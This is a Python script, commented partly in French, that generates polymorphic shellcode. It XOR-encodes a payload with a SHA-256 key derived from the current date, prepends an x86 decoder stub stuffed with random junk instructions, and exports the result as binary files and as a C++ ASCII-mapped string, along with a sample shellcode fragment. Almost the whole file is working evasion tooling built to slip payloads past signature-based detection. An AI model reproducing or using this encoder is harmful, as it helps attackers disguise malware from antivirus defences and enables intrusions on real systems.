import random
import hashlib
from datetime import datetime

JUNK_INSTRUCTIONS = [
    [0x90],                      # nop
    [0x51, 0x59],                # push ecx; pop ecx
    [0x52, 0x5A],                # push edx; pop edx
    [0x53, 0x5B],                # push ebx; pop ebx
    [0x89, 0xf6],                # mov esi, esi
    [0x31, 0xc0],                # xor eax, eax
]

def insert_junk_instructions(stub: list[int], count: int = 3) -> list[int]:
    for _ in range(count):
        junk = random.choice(JUNK_INSTRUCTIONS)
        pos = random.randint(0, len(stub))
        stub = stub[:pos] + junk + stub[pos:]
    return stub

def junk_addition_via_negation():
    return insert_junk_instructions([0x8b, 0xc3, 0xf7, 0xd1, 0x29, 0xc1])

def junk_addition_double_negation():
    return insert_junk_instructions([0x8b, 0xd8, 0xf7, 0xd3, 0xf7, 0xd1, 0x01, 0xcb, 0xf7, 0xdb])

def junk_xor_substitution():
    return insert_junk_instructions([0x33, 0xc0, 0xf7, 0xd0, 0x23, 0xd8, 0xf7, 0xd3, 0x23, 0xc3, 0x09, 0xd8])

def junk_rand_add_chain():
    r = random.randint(1, 255)
    return insert_junk_instructions([0xb8, r, 0x00, 0x00, 0x00, 0x8b, 0xd8, 0x03, 0xc3, 0x03, 0xc1, 0x2b, 0xc3])

def junk_math_sub():
    return insert_junk_instructions([0x89, 0xC8, 0xF7, 0xD8, 0x01, 0xD8])

def junk_xor():
    return insert_junk_instructions([0x89, 0xC8, 0x21, 0xD0, 0x89, 0xD9, 0x31, 0xD3, 0x09, 0xD8])

def build_junk_math_block() -> list[int]:
    blocks = [junk_addition_via_negation, junk_addition_double_negation, junk_xor_substitution, junk_rand_add_chain, junk_math_sub, junk_xor]
    selected_blocks = random.sample(blocks, k=random.randint(2, 4))
    result = []
    for block in selected_blocks:
        result += block()
    return result

def calculate_raw_key() -> int:
    today = datetime.today()
    return ((today.month + today.day) * today.year) & 0xFF

def derive_sha256_hash(raw_key: int) -> bytes:
    key_bytes = raw_key.to_bytes(2, byteorder='big')
    return hashlib.sha256(key_bytes).digest()

def xor_encode_full_hash(shellcode: list[int], hash_bytes: bytes) -> list[int]:
    return [b ^ hash_bytes[i % 32] for i, b in enumerate(shellcode)]

def generate_decoder_stub(shell_len: int) -> list[int]:
    stub = [
        0xeb, 0x10,                   # jmp short get_data
        0x5e,                         # pop esi
        0x5f,                         # pop edi
        0x31, 0xc9,                   # xor ecx, ecx
        0xb1, shell_len,              # mov cl, <shellcode_len>
        0x8a, 0x06,                   # mov al, [esi]
        0x30, 0x07,                   # xor al, [edi]
        0x88, 0x06,                   # mov [esi], al
        0x46,                         # inc esi
        0x47,                         # inc edi
        0xe2, 0xf4,                   # loop loop
        0xff, 0xe6,                   # jmp esi
        0xe8, 0xeb, 0xff, 0xff, 0xff  # call decode
    ]

    junk = build_junk_math_block()
    stub = junk + insert_junk_instructions(stub, count=random.randint(3, 6))
    return stub

def generate_byte_to_ascii_map(shellcode: list[int]) -> str:
    printable_ascii = [chr(c) for c in range(33, 127)]  
    unique_bytes = sorted(set(shellcode))

    if len(unique_bytes) > len(printable_ascii):
        raise ValueError("Shellcode trop long / trop de bytes uniques pour un mapping ASCII unique")

    byte_to_char = {b: printable_ascii[i] for i, b in enumerate(unique_bytes)}

    cpp_map_entries = ',\n    '.join(f'{{0x{b:02x}, \'{c}\'}}' for b, c in byte_to_char.items())
    cpp_map_inverse_entries = ',\n    '.join(f'{{\'{c}\', 0x{b:02x}}}' for b, c in byte_to_char.items())

    cpp_code = (
        '#include <map>\n#include <cstdint>\n#include <string>\n\n'
        'std::map<uint8_t, char> byte_to_ascii = {\n'
        f'    {cpp_map_entries}\n'
        '};\n\n'
        'std::map<char, uint8_t> ascii_to_byte = {\n'
        f'    {cpp_map_inverse_entries}\n'
        '};\n\n'
        '// Shellcode encodé en ASCII via la map :\n'
        'std::string encoded_shellcode = "'
    )
    encoded_shellcode_str = ''.join(byte_to_char[b] for b in shellcode)
    cpp_code += encoded_shellcode_str + '";\n'

    return cpp_code

def generate_polymorphic_shellcode(original_shellcode: bytes) -> tuple[list[int], bytes]:
    raw_key = calculate_raw_key()
    hash_bytes = derive_sha256_hash(raw_key)
    print(f"[+] Raw key: 0x{raw_key:02x}")
    print(f"[+] SHA-256: {hash_bytes.hex()}")

    shellcode_list = list(original_shellcode)
    encoded_shellcode = xor_encode_full_hash(shellcode_list, hash_bytes)
    stub = generate_decoder_stub(len(original_shellcode))
    return stub + encoded_shellcode, hash_bytes

# === SHELLCODE EXEMPLE ===
original_shellcode = (
    b"\xdb\xc3\xd9\x74\x24\xf4\xbd\x69\x7c\xa7\x39\x5f\x2b"
    b"\xc9\xb1\x31\x31\x6f\x18\x03\x6f\x18\x83\xc7\x5b\x6b"
    b"\x44\x4b\x8b\xe9\xa7\xb4\x4b\x8e\x2e\x51\x7a\x8e\x55"
)

if __name__ == "__main__":
    polymorphic_shellcode, key_bytes = generate_polymorphic_shellcode(original_shellcode)
    print("[+] Polymorphic shellcode (bytes):")
    print(polymorphic_shellcode)

    with open("polymorphic_shellcode.bin", "wb") as f:
        f.write(bytearray(polymorphic_shellcode))
    print("[+] Shellcode polymorphe écrit dans 'polymorphic_shellcode.bin'")

    with open("key.txt", "w") as f:
        f.write(key_bytes.hex())
    print("[+] Clé SHA-256 écrite dans 'key.txt'")

    try:
        cpp_code = generate_byte_to_ascii_map(polymorphic_shellcode)
        print(cpp_code)
    except ValueError as e:
        print(f"Erreur : {e}")
        exit(1)

    with open("shellcode_ascii_map.cpp", "w", encoding="utf-8") as f:
        f.write(cpp_code)
    print("[+] Shellcode encodé ASCII avec mapping byte->char écrit dans 'shellcode_ascii_map.cpp'")
